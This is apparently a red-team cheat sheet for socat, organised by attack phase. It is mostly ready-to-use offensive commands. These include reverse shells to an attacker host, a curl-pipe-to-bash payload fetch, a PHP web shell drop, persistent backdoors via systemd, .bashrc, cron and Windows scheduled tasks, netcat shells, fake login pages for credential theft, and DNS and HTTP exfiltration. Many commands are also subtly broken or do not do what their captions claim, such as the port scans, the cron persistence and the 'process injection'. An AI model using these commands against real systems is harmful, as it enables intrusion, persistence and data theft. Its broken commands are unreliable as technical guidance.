# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

# SoCat

SoCat (`socat`) is a powerful networking utility that can be thought of as a more advanced version of NetCat. It supports a wide range of network protocols, provides extensive data manipulation capabilities, and is extremely versatile for networking tasks such as port forwarding, file transfers, tunneling, and more. This ultimate edition of the cheat sheet provides a comprehensive guide to using SoCat, including detailed commands and penetration testing techniques.

## Basic Syntax
```bash
socat [options] <source> <destination>
```

## Core Options
- `-d -d`: Increases verbosity by enabling debugging output.
- `-v`: Increases verbosity, useful for troubleshooting.
- `-x`: Hex dump of all data to stderr, useful for debugging.
- `-T <timeout>`: Set a timeout for the connection.
- `-b <buffersize>`: Set the buffer size for data transfers.
- `-u`: Use unidirectional data flow (default is bidirectional).
- `-L <logfile>`: Logs all data to a file.
- `-s`: Enables syslog for all messages.
- `-b <buffersize>`: Sets the buffer size for reading and writing.
- `-l`: Listen mode, wait for an incoming connection.
- `-b <buffersize>`: Adjust the buffer size to optimize data flow.

## Commonly Used Address Types
- `TCP:<host>:<port>`: Establishes a TCP connection to the specified host and port.
- `TCP-LISTEN:<port>`: Listens for incoming TCP connections on the specified port.
- `UDP:<host>:<port>`: Establishes a UDP connection to the specified host and port.
- `UDP-LISTEN:<port>`: Listens for incoming UDP connections on the specified port.
- `EXEC:<command>`: Executes a command, useful for creating shells.
- `PTY`: Creates a pseudo-terminal, useful for creating interactive sessions.
- `GOPEN:<filename>`: Opens a file for reading/writing, useful for file transfers.
- `OPENSSL-LISTEN:<port>`: Listens for incoming SSL/TLS connections on the specified port.
- `OPENSSL:<host>:<port>`: Establishes an SSL/TLS connection to the specified host and port.
- `SOCKS4:<host>:<port>`: Connects to a SOCKS4 proxy at the specified host and port.
- `SOCKS4-LISTEN:<port>`: Listens for incoming SOCKS4 proxy connections on the specified port.
- `PROXY:<host>:<port>`: Connects to a generic HTTP proxy.

# Commands and Use Cases

#### Port Forwarding Techniques
SoCat excels at port forwarding, offering more options and flexibility than NetCat.

1. **Basic Port Forwarding**: Forwards traffic from `<local_port>` to `<target_ip>:<target_port>`.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork TCP:<target_ip>:<target_port>
    ```
2. **Reverse Port Forwarding**: Listens on `<target_port>` and forwards traffic to `<attack_ip>:<attack_port>`.
    ```bash
    socat TCP:<attack_ip>:<attack_port> TCP-LISTEN:<target_port>,reuseaddr,fork
    ```
3. **UDP Port Forwarding**: Forwards UDP traffic from `<local_port>` to `<target_ip>:<target_port>`.
    ```bash
    socat UDP-LISTEN:<local_port>,reuseaddr,fork UDP:<target_ip>:<target_port>
    ```
4. **Dynamic Port Forwarding with SOCKS Proxy**: Creates a dynamic port forward through a SOCKS proxy, allowing for complex routing scenarios.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SOCKS4:<target_ip>:<target_port>,socksport=<socks_port>
    ```
5. **HTTP Proxy Forwarding**: Forwards traffic through an HTTP proxy, allowing you to conceal your IP address.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork PROXY:<proxy_ip>:<proxy_port>/TCP:<target_ip>:<target_port>
    ```
6. **Chained Port Forwarding**: Chains multiple port forwards together, which is useful for complex routing or bypassing firewalls.
    ```bash
    socat TCP-LISTEN:<local_port1>,reuseaddr,fork TCP:<intermediate_ip>:<intermediate_port> | socat - TCP:<target_ip>:<target_port>
    ```
7. **SSL/TLS Encrypted Port Forwarding**: Encrypts port forwarding with SSL/TLS, ensuring confidentiality over insecure networks.
    ```bash
    socat OPENSSL-LISTEN:<local_port>,cert=server-cert.pem,key=server-key.pem,cafile=ca-cert.pem,verify=0,fork TCP:<target_ip>:<target_port>
    ```
8. **IPv6 Port Forwarding**: Forwards traffic over IPv6, useful for environments transitioning to or using IPv6.
    ```bash
    socat TCP6-LISTEN:<local_port>,reuseaddr,fork TCP6:<target_ip>:<target_port>
    ```

#### File Transfer Techniques

1. **Secure File Transfer with SSL/TLS**: Encrypts file transfers using SSL/TLS, ensuring data confidentiality.
    ```bash
    socat OPENSSL-LISTEN:<local_port>,cert=server-cert.pem,key=server-key.pem,cafile=ca-cert.pem,verify=0,fork FILE:<file_to_send>
    # On the receiving end:
    socat - OPENSSL:<attack_ip>:<attack_port>,verify=0 > <output_file>
    ```
2. **Large File Transfer with Compression**: Compresses data during transfer, reducing the amount of data transmitted over the network.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"gzip -c <file_to_send>" | socat - TCP:<target_ip>:<target_port> SYSTEM:"gzip -d > <output_file>"
    ```
3. **Multicast File Transfer**: Sends a file to multiple recipients simultaneously using multicast.
    ```bash
    socat UDP-SENDTO:<multicast_ip>:<multicast_port> FILE:<file_to_send>
    # On multiple receiving ends:
    socat UDP-RECVFROM:<multicast_port>,ip-add-membership=<multicast_ip>:<local_ip> FILE:<output_file>
    ```
4. **Resumable File Transfer**: Allows for resuming interrupted file transfers by specifying a byte offset.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork FILE:<file_to_send>,seek=<offset>
    # On the receiving end:
    socat - TCP:<attack_ip>:<attack_port> FILE:<output_file>,seek=<offset>
    ```
5. **Bidirectional File Transfer**: Enables bidirectional file transfers, where both the sender and receiver can send and receive data simultaneously.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork GOPEN:<file_to_send>,create TCP:<target_ip>:<target_port>
    ```
6. **Encrypted and Compressed File Transfer**: Combines compression and encryption to secure and optimize file transfers.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork EXEC:"gzip -c <file_to_send> | openssl enc -aes-256-cbc -salt -pass pass:<password>" | socat - TCP:<target_ip>:<target_port> EXEC:"openssl enc -d -aes-256-cbc -pass pass:<password> | gzip -d > <output_file>"
    ```
7. **Automated Backup Transfer**: Automates the transfer of backup data from one system to another.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"tar -czf - /path/to/backup" | socat - TCP:<target_ip>:<target_port> SYSTEM:"tar -xzf - -C /path/to/restore"
    ```

#### Shells and Backdoors

1. **Basic Reverse Shell**: Creates a basic reverse shell that connects back to the attacker's machine.
    ```bash
    socat TCP:<attack_ip>:<attack_port> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    ```
2. **Encrypted Reverse Shell**: Creates an SSL/TLS-encrypted reverse shell, securing the connection from eavesdropping.
    ```bash
    socat OPENSSL:<attack_ip>:<attack_port>,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    ```
3. **Windows Reverse Shell**: Establishes a reverse shell on a Windows system using `cmd.exe`.
    ```bash
    socat TCP:<attack_ip>:<attack_port> EXEC:'cmd.exe',pty,stderr,setsid,sigint,sane
    ```
4. **Fully Interactive TTY Shell**: Provides a fully interactive TTY shell, ensuring better interaction with the shell session.
    ```bash
    socat TCP-LISTEN:<attack_port>,reuseaddr,fork EXEC:"bash -li",pty,stderr,setsid,sigint,sane
    ```
5. **Polyglot Reverse Shell**: A versatile script that attempts multiple reverse shell methods across different environments.
    ```bash
    socat TCP:<attack_ip>:<attack_port> EXEC:'/bin/bash -i >& /dev/tcp/<attack_ip>/<attack_port> 0>&1' || \
    socat TCP:<attack_ip>:<attack_port> EXEC:'/bin/sh -i >& /dev/tcp/<attack_ip>/<attack_port> 0>&1' || \
    socat TCP:<attack_ip>:<attack_port> EXEC:'/usr/bin/python3 -c "import pty; pty.spawn(\'/bin/bash\')"' || \
    socat TCP:<attack_ip>:<attack_port> EXEC:'/usr/bin/perl -e "use Socket; socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname(\'tcp\')); connect(SOCK, sockaddr_in(<attack_port>, inet_aton(\'<attack_ip>\'))); open(STDIN, \">&SOCK\"); open(STDOUT, \">&SOCK\"); open(STDERR, \">&SOCK\"); exec(\'/bin/sh -i\');"' || \
    socat TCP:<attack_ip>:<attack_port> EXEC:'/usr/bin/ruby -rsocket -e "exit if fork; c=TCPSocket.new(\'<attack_ip>\',\'<attack_port>\'); while(cmd = c.gets); IO.popen(cmd, \'r\'){|io| c.print io.read} end"'
    ```
6. **ICMP Backdoor**: Creates a covert ICMP-based backdoor that can evade many network detection systems.
    ```bash
    socat ICMP-RECVFROM:<local_ip> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    ```
7. **Persistent Backdoor with Multiple Fallbacks**: Creates a persistent backdoor with multiple fallback IPs and ports to maintain access.
    ```bash
    while true; do 
      socat TCP:<attack_ip1>:<attack_port1> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane || 
      socat TCP:<attack_ip2>:<attack_port2> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane || 
      socat TCP:<attack_ip3>:<attack_port3> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane;
      sleep 60; 
    done
    ```

#### Proxying and Tunneling

1. **SOCKS5 Proxy Setup**: Creates a SOCKS5 proxy that allows you to route traffic through an intermediate system.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SOCKS5:<target_ip>:<target_port>
    ```
2. **Layered Tunneling for Obfuscation**: Chains multiple tunnels together to obfuscate traffic, making it more difficult to detect.
    ```bash
    socat TCP-LISTEN:<local_port1>,reuseaddr,fork TCP:<intermediate_ip1>:<intermediate_port1> | socat - TCP:<intermediate_ip2>:<intermediate_port2> | socat - TCP:<target_ip>:<target_port>
    ```
3. **Reverse Proxy with Authentication**: Configures a reverse proxy that requires HTTP authentication.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"echo 'HTTP/1.1 407 Proxy Authentication Required\r\nProxy-Authenticate: Basic realm=\"Proxy\"\r\n\r\n' | socat - TCP:<target_ip>:<target_port>"
    ```
4. **Dynamic Port Forwarding with Traffic Shaping**: Creates a dynamic port forward with traffic shaping to simulate legitimate network behavior.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"tc qdisc add dev eth0 root netem delay 100ms" | socat - TCP:<target_ip>:<target_port>
    ```
5. **DNS Tunneling**: Exfiltrates data using DNS queries, which can often bypass traditional security mechanisms.
    ```bash
    socat UDP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"echo <data_to_exfiltrate> | xxd -p | sed 's/\(..\)/\1./g' | socat - TCP:<dns_server>:53"
    ```

#### Encryption and Steganography

1. **Encrypted Communications with AES**: Encrypts communication using AES-256-CBC, ensuring data confidentiality.
    ```bash
    socat - OPENSSL-LISTEN:<local_port>,reuseaddr,fork,verify=0,cipher=AES-256-CBC,cert=server-cert.pem,key=server-key.pem
    socat - OPENSSL:<target_ip>:<target_port>,verify=0,cipher=AES-256-CBC,cert=client-cert.pem,key=client-key.pem
    ```
2. **Steganographic Data Transfer**: Embeds sensitive data within an image file using steganography before transferring it.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork EXEC:"steghide embed -cf image.jpg -ef <file_to_send>"
    socat - TCP:<target_ip>:<target_port> > <output_image.jpg>
    ```
3. **Combining Encryption and Compression**: Encrypts and compresses data during transfer to optimize security and performance.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"openssl enc -aes-256-cbc -salt -in <file_to_send> | gzip -c" | socat - TCP:<target_ip>:<target_port> SYSTEM:"gzip -d | openssl enc -d -aes-256-cbc -out <output_file>"
    ```
4. **Encrypted Proxy with Certificate Validation**: Creates an encrypted proxy with strict certificate validation to ensure secure communication.
    ```bash
    socat OPENSSL-LISTEN:<local_port>,cert=server-cert.pem,key=server-key.pem,cafile=ca-cert.pem,verify=1,fork TCP:<target_ip>:<target_port>
    ```
5. **IPv6 Encrypted Communication**: Encrypts communication over IPv6, useful for environments transitioning to or using IPv6.
    ```bash
    socat OPENSSL6-LISTEN:<local_port>,cert=server-cert.pem,key=server-key.pem,cafile=ca-cert.pem,verify=0,fork TCP6:<target_ip>:<target_port>
    ```

# Penetration Testing Techniques

#### External Reconnaissance

SoCat can be used for external reconnaissance to map out networks, identify services, and gather information about the target environment.

1. **Port Scanning with Output Control**: Scans a specific port and logs the result to a file.
    ```bash
    socat - TCP:<target_ip>:<target_port> SYSTEM:"echo '<target_port> open' > port_scan_results.txt"
    ```
2. **Service Identification via Banner Grabbing**: Sends a crafted HTTP request to identify the service running on a specific port.
    ```bash
    socat - TCP:<target_ip>:<target_port> SYSTEM:"echo 'HEAD / HTTP/1.1\r\nHost: <target_ip>\r\n\r\n' | socat - TCP:<target_ip>:<target_port>"
    ```
3. **OS Detection via Timing Analysis**: Measures response times to infer details about the target operating system.
    ```bash
    socat - TCP:<target_ip>:<target_port>,interval=0.5 SYSTEM:"echo '<target_ip>:<target_port> seems alive'"
    ```
4. **Enumerating Public Services**: Enumerates open ports on a target and logs the results.
    ```bash
    socat - TCP:<target_ip>:<target_port> SYSTEM:"echo '<target_port> open on <target_ip>' >> services.txt"
    ```
5. **Detection of Hidden Services**: Detects hidden services by probing specific ports and logging any responses.
    ```bash
    socat - TCP:<target_ip>:<target_port> SYSTEM:"echo '<target_port> detected on <target_ip>' >> hidden_services.txt"
    ```

#### Initial Access

SoCat can be used to gain initial access to a target system through exploitation of vulnerabilities or by establishing covert channels.

1. **Command Injection Exploitation**: Executes a command injection vulnerability to download and execute a malicious script.
    ```bash
    socat - TCP:<target_ip>:<target_port> SYSTEM:"curl http://<attack_ip>:<attack_port>/exploit.sh | bash"
    ```
2. **Exploiting Misconfigured Services**: Exploits a misconfigured service to open a shell on the target system.
    ```bash
    socat - TCP:<target_ip>:<target_port> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    ```
3. **File Inclusion Vulnerability Exploitation**: Uploads a PHP web shell via a file inclusion vulnerability.
    ```bash
    socat - TCP:<target_ip>:<target_port> SYSTEM:"echo '<?php system(\$_GET[\'cmd\']); ?>' > /var/www/html/shell.php"
    ```
4. **Client-Side Exploit Delivery**: Hosts a client-side exploit and delivers it to a vulnerable target.
    ```bash
    socat TCP-LISTEN:<attack_port>,reuseaddr,fork SYSTEM:"curl http://<attack_ip>:<attack_port>/exploit.js"
    ```
5. **Credential Harvesting via Social Engineering**: Sets up a social engineering trap to harvest user credentials.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"echo 'Please enter your credentials:' && read -p 'Username: ' user && read -sp 'Password: ' pass && echo 'Credentials captured: $user:$pass' >> credentials.txt"
    ```

#### Persistence

SoCat can help maintain access to a compromised system by establishing persistent backdoors, scheduled tasks, and other techniques.

1. **Cron Job for Persistent Access**: Sets up a cron job that regularly connects back to the attacker's machine.
    ```bash
    socat TCP:<attack_ip>:<attack_port> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane | crontab -
    ```
2. **Service-Based Persistence**: Configures a systemd service to maintain persistent access via SoCat.
    ```bash
    echo "[Unit]
    Description=SoCat Persistent Backdoor

    [Service]
    ExecStart=/usr/bin/socat TCP-LISTEN:<local_port>,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

    [Install]
    WantedBy=multi-user.target" > /etc/systemd/system/socat-backdoor.service

    systemctl enable socat-backdoor.service
    systemctl start socat-backdoor.service
    ```
3. **Manipulating User Startup Scripts**: Adds a SoCat backdoor to a user's `.bashrc` file for persistence.
    ```bash
    echo "socat TCP:<attack_ip>:<attack_port> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &" >> ~/.bashrc
    ```
4. **Scheduled Task for Windows Persistence**: Creates a scheduled task on a Windows system to maintain persistence.
    ```bash
    echo "schtasks /create /sc minute /mo 5 /tn SoCat_Backdoor /tr \"socat TCP:<attack_ip>:<attack_port> EXEC:cmd.exe,pty,stderr,setsid,sigint,sane\"" > C:\Windows\Temp\socat-backdoor.bat
    ```
5. **Covert Persistence via Network Services**: Establishes a persistent backdoor through an existing network service.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork EXEC:"nc -e /bin/bash <attack_ip> <attack_port>"
    ```

#### Credential Harvesting

SoCat can intercept and capture credentials as they are transmitted over the network or via phishing techniques.

1. **Intercepting FTP Credentials**: Captures FTP credentials by listening on port 21.
    ```bash
    socat TCP-LISTEN:21,reuseaddr,fork SYSTEM:"tee ftp_credentials.txt"
    ```
2. **Phishing with Fake Login Page**: Hosts a fake login page to capture user credentials.
    ```bash
    socat TCP-LISTEN:80,reuseaddr,fork SYSTEM:"echo 'HTTP/1.1 200 OK\r\n\r\n<form method=\"POST\"><input name=\"user\"><input name=\"pass\"><input type=\"submit\"></form>' | socat - TCP:<attack_ip>:<attack_port>"
    ```
3. **Intercepting SMTP Credentials**: Listens on port 25 to intercept SMTP credentials.
    ```bash
    socat TCP-LISTEN:25,reuseaddr,fork SYSTEM:"tee smtp_credentials.txt"
    ```
4. **Man-in-the-Middle Attack for Credential Harvesting**: Redirects HTTP traffic to capture credentials during a man-in-the-middle attack.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <capture_port>" | socat - TCP:<target_ip>:<target_port> SYSTEM:"tee http_credentials.txt"
    ```
5. **Honeyport for Credential Harvesting**: Sets up a honeyport to attract and capture unauthorized login attempts.
    ```bash
    socat TCP-LISTEN:<honeyport>,reuseaddr,fork SYSTEM:"tee credentials.txt"
    ```

#### Privilege Escalation

SoCat can be used in the escalation of privileges by exploiting services, transferring exploits, or pivoting through compromised systems.

1. **SUID Binary Exploitation**: Transfers and executes an exploit targeting a vulnerable SUID binary.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"nc -e /bin/bash <attack_ip> <attack_port>" | socat - EXEC:/path/to/suid_exploit
    ```
2. **Local Exploit Transfer**: Transfers and compiles a local privilege escalation exploit.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"tee local_exploit.c"
    gcc local_exploit.c -o local_exploit
    ./local_exploit
    ```
3. **Pivoting Through a Compromised System**: Uses SoCat to pivot through a compromised system and gain access to other machines within the network.
    ```bash
    socat TCP:<compromised_ip>:<compromised_port> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    ```
4. **Abusing Weak File Permissions**: Creates a SUID binary to escalate privileges by exploiting weak file permissions.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"echo 'nc -e /bin/bash <attack_ip> <attack_port>' > /tmp/exploit && chmod +s /tmp/exploit"
    ```
5. **Injecting SoCat into a Running Process**: Injects a SoCat backdoor into a running process, allowing for privilege escalation.
    ```bash
    socat TCP:<target_ip>:<target_port> EXEC:"echo -ne '\x50\x52\x45\x59' | socat - TCP:<attack_ip>:<attack_port>"
    ```

#### Internal Reconnaissance

Once inside a network, SoCat can be used to further map out the internal environment, identify critical systems, and gather intelligence.

1. **Scanning Internal Hosts**: Scans internal hosts for open SSH ports and logs the results.
    ```bash
    socat - TCP:<internal_ip>:22 SYSTEM:"echo '<internal_ip> is up' >> internal_hosts.txt"
    ```
2. **Service Enumeration**: Enumerates open ports on an internal IP and logs the services running.
    ```bash
    socat - TCP:<internal_ip>:<port_range> SYSTEM:"echo '<port> open on <internal_ip>' >> services.txt"
    ```
3. **Capturing Internal Traffic**:Captures internal network traffic for analysis.
    ```bash
    socat UDP-LISTEN:<capture_port>,reuseaddr,fork SYSTEM:"tee internal_traffic.pcap"
    ```
 4. **Identifying Critical Systems**: Identifies critical systems by probing specific services, such as SMB.
    ```bash
    socat - TCP:<internal_ip>:445 SYSTEM:"echo '<internal_ip> has SMB running' >> critical_systems.txt"
    ```
5. **Service Version Detection**: Enumerates service versions by sending crafted requests.
    ```bash
    socat - TCP:<internal_ip>:<port> SYSTEM:"echo 'GET / HTTP/1.1\r\nHost: <internal_ip>\r\n\r\n' | socat - TCP:<internal_ip>:<port>"
    ```

#### Lateral Movement, Pivoting, and Tunneling

SoCat is highly effective for lateral movement within a network, pivoting between systems, and tunneling traffic through compromised hosts.

1. **Port Forwarding for Lateral Movement**: Forwards traffic from one machine to another, enabling lateral movement within the network.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork TCP:<target_ip>:<target_port>
    ```
2. **Pivoting Through a Compromised Host**: Tunnels traffic through a compromised host to access internal systems.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"nc -e /bin/bash <internal_ip> <internal_port>"
    ```
3. **Tunneling Data Through SoCat**: Creates a tunnel to exfiltrate data from an internal system through an externally facing compromised host.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"nc -e /bin/bash <internal_ip> <internal_port>"
    ```
4. **Chained Tunneling for Obfuscation**: Chains multiple tunnels together to obfuscate traffic, making it more difficult to detect.
    ```bash
    socat TCP-LISTEN:<local_port1>,reuseaddr,fork TCP:<intermediate_ip1>:<intermediate_port1> | socat - TCP:<intermediate_ip2>:<intermediate_port2> | socat - TCP:<target_ip>:<target_port>
    ```
5. **Reverse Tunneling for Persistent Access**: Establishes a reverse tunnel to maintain access even after the initial compromise.
    ```bash
    ssh -R <remote_port>:localhost:<local_port> user@<remote_host>
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"nc -e /bin/bash <remote_host> <remote_port>"
    ```

#### Defense Evasion

SoCat provides numerous ways to evade detection by network security devices and analysts, making it a valuable tool for maintaining stealth.

1. **Stealth Scanning with Output Suppression**: Suppresses output to avoid generating noticeable network traffic.
    ```bash
    socat - TCP:<target_ip>:<target_port>,interval=0.5 SYSTEM:"echo 'scan completed'"
    ```
2. **Traffic Obfuscation with Encryption**: Encrypts data being sent over the network to avoid detection by IDS/IPS.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"openssl enc -aes-256-cbc -salt -in plaintext.txt | socat - TCP:<target_ip>:<target_port>"
    ```
3. **Fragmented Data Transfer**: Transfers large files in smaller fragments to avoid triggering network security thresholds.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"split -b 1024M <large_file> && for f in x*; do socat - TCP:<target_ip>:<target_port> < $f; done"
    ```
4. **Using Randomized Ports**: Randomizes the local and remote ports to avoid port-based filtering.
    ```bash
    socat TCP-LISTEN:$(shuf -i 2000-65000 -n 1),reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    ```
5. **Obfuscating Commands**: Encodes commands to obfuscate them from detection, then decodes and executes them on the target.
    ```bash
    socat TCP:<target_ip>:<target_port> SYSTEM:"echo 'Y3VybCBodHRwOi8vPHRhcmdldF9pcD46PHRhcmdldF9wb3J0Pj8gPiBjdGwuZXh' | base64 -d | socat - TCP:<attack_ip>:<attack_port>"
    ```

#### Data Exfiltration

SoCat is an excellent tool for exfiltrating data from compromised systems, especially when paired with encryption and tunneling techniques.

1. **Exfiltrating Sensitive Data**: Exfiltrates sensitive data from the target system to the attacker.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"tee exfiltrated_data.txt"
    socat - TCP:<target_ip>:<target_port> < sensitive_data.txt
    ```
2. **Exfiltration Over HTTP**: Exfiltrates data over HTTP to avoid detection.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"curl http://<target_ip>:<target_port>/data -d @sensitive_data.txt"
    socat - TCP:<target_ip>:<target_port> > exfiltrated_data.txt
    ```
3. **DNS Tunneling for Data Exfiltration**: Exfiltrates data using DNS requests, which can often bypass traditional security mechanisms.
    ```bash
    socat UDP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"while read line; do nslookup $line.<attack_domain>; done < sensitive_data.txt"
    ```
4. **Encrypted Data Exfiltration**: Encrypts sensitive data before exfiltration, ensuring that it remains confidential even if intercepted.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"openssl enc -aes-256-cbc -salt -in sensitive_data.txt"
    socat - TCP:<target_ip>:<target_port> > exfiltrated_data.enc
    ```
5. **Steganographic Data Exfiltration**: Embeds sensitive data within an image file using steganography before exfiltrating it.
    ```bash
    socat TCP-LISTEN:<local_port>,reuseaddr,fork SYSTEM:"steghide embed -cf image.jpg -ef sensitive_data.txt"
    socat - TCP:<target_ip>:<target_port> > exfiltrated_image.jpg
    ```

# Resources

|**Name**|**URL**|
|---|---|
|SoCat Documentation|http://www.dest-unreach.org/socat/doc/socat.html|
|SoCat Usage Examples|https://linux.die.net/man/1/socat|
|SoCat Command Guide|https://www.digitalocean.com/community/tutorials/how-to-use-socat-as-a-proxy-client-and-server|
|Advanced SoCat Techniques|https://null-byte.wonderhowto.com/how-to/socat-swiss-army-knife-hacks-0207835/|
|Reverse Shell Cheatsheet|https://highon.coffee/blog/reverse-shell-cheat-sheet/|
|Tunneling with SoCat|https://resources.infosecinstitute.com/topic/socat-tunneling-and-reverse-shells/|
|Stealth Techniques Using SoCat|https://securitytrails.com/blog/socat-examples|
|Data Exfiltration Techniques|https://www.fireeye.com/blog/threat-research/2019/01/exfiltration-over-alternate-protocols.html|
|SoCat in CTF Challenges|https://ctftime.org/writeups/overview/socat|
|Using SoCat for Pivoting in Complex Networks|https://www.pentestpartners.com/security-blog/pivoting-in-a-complex-network-with-socat/|